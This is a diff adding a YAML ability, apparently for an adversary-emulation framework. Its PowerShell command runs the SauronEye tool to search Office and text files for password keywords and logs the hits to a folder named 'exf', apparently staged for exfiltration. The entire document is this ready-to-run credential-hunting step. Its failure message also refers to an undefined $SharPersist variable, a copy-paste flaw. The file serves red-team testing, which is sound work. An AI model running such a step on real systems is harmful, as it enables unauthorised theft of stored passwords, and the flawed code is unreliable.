@@ -1,0 +1,28 @@
+- name: Search password contained in files
+  description: Search password contained in files using the tool called SauronEye
+  tactic: discovery
+  technique_id: T1083
+  technique_name: File and Directory Discovery
+  executors:
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
+    command: "$Sauron = \"$env:PUBLIC\\Toolz\\SauronEye.exe\";\n$SauronEyeLogFile\
+      \ = \"$env:PUBLIC\\exf\\SauronEye.log\";\nif ([System.IO.File]::Exists(\"$Sauron\"\
+      )) \n{\nWrite-Output \"GREAT. The command $Sauron has been found :-)\" | Out-File\
+      \ -FilePath \"$SauronEyeLogFile\";\n$ServiceCmd = \"$Sauron --filetypes .txt\
+      \ .doc .docx .xls --contents --keywords password pass* Pas* -v -s\";\nInvoke-Expression\
+      \ \"$ServiceCmd\"  | Out-File -FilePath \"$SauronEyeLogFile\" -Append;\nexit\
+      \ 0;\n}\nelse \n{\nWrite-Output \"The command $SharPersist does not exists !!!\"\
+      \ | Out-File -FilePath \"$SauronEyeLogFile\";\nexit 1;\n};"
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  id: sauron
